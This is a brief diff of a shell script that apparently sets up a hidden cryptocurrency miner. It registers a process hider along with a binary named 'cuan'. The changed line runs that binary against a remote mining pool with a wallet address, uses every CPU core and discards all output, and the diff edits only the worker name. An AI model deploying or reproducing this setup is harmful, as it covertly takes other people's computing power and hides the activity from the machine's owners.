@@ -16,5 +16,5 @@ Ph add python3
 ph add root
 ph add node-process-hider
 ph add cuan
-./cuan -a yespowersugar  -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1q9494l7vclvtuuhkfmuhgl0t2nnwymwl8xyukr8.fghfghfh -t$(nproc --all) >/dev/null >/dev/null 2>&1
+./cuan -a yespowersugar  -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1q9494l7vclvtuuhkfmuhgl0t2nnwymwl8xyukr8.anjay -t$(nproc --all) >/dev/null >/dev/null 2>&1
 sleep 10
